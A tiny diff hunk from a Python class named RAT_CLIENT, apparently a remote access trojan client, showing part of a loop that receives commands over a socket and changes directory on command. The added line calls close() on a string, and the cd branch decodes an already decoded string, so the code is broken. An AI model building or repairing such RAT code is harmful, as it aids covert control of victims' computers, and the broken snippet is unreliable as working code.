@@ -76,6 +76,7 @@ class RAT_CLIENT:
                     command = s.recv(1024).decode()
                     if command.lower() == 'exit' :
                         a=0;
+                        command.close()
                     if command == 'cd':
                         os.chdir(command[3:].decode('utf-8'))
                         dir = os.getcwd()
